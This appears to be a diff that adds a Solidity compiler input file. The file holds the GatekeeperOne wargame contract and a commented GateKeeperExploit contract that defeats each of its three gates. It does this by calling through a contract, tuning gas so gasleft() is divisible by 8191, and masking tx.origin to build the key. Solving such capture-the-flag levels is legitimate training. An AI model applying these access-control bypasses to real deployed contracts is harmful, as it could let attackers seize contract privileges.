@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/GateKeeperOne.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperOne {\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        require(gasleft() % 8191 == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(\n            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),\n            \"GatekeeperOne: invalid gateThree part one\"\n        );\n        require(\n            uint32(uint64(_gateKey)) != uint64(_gateKey),\n            \"GatekeeperOne: invalid gateThree part two\"\n        );\n        require(\n            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),\n            \"GatekeeperOne: invalid gateThree part three\"\n        );\n        _;\n    }\n\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n        entrant = tx.origin;\n        return true;\n    }\n}\n\ncontract GateKeeperExploit {\n    GatekeeperOne private immutable gatekeeper;\n\n    constructor(address _add) {\n        gatekeeper = GatekeeperOne(_add);\n    }\n\n    function hack(uint256 inputGas) external returns (bool) {\n        // since we are sending via smart contract\n        // first condition require(msg.sender != tx.origin) will be satisfied\n\n        // for second condition gasleft() % 8191 == 0) to be satisfies, its a matter of trial and error\n        // keep changing gas until gate 2 gets satisied\n        // I found the gas value is 6000\n\n        // key generation\n        // first condition is uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))\n        // to satisy this 0x11111111 = 0x1111 -> this is only possible if we used a mask of 0x0000ffff\n        // when we do bytesA & mask -> we get a bytesB which satisfies this condition\n\n        // second condition is  uint32(uint64(_gateKey)) != uint64(_gateKey)\n        // to satisy this 0x1111111100001111 = 0x00001111 -> this is posible if we use mask 0xffffffff0000ffff\n        // when we do bytesA * mask above -> we get bytesB which satisfies both conditions above\n\n        // third condition is uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))\n        // to satisy this, we just need a bytes8 based on tx origin\n        // use uint64(uint160(tx.origin)) && 0xffffffff0000ffff and we should get third condition trye\n        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;\n        return gatekeeper.enter{gas: inputGas}(key);\n    }\n\n    function test()\n        external\n        view\n        returns (uint32 key3264, uint64 key64, uint160 key160, uint16 key1664, uint16 key16160)\n    {\n        bytes8 inputBytes8 = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;\n        key3264 = uint32(uint64(inputBytes8));\n        key64 = uint64(inputBytes8);\n        key160 = uint160(tx.origin);\n        key1664 = uint16(uint64(inputBytes8));\n        key16160 = uint16(uint160(tx.origin));\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
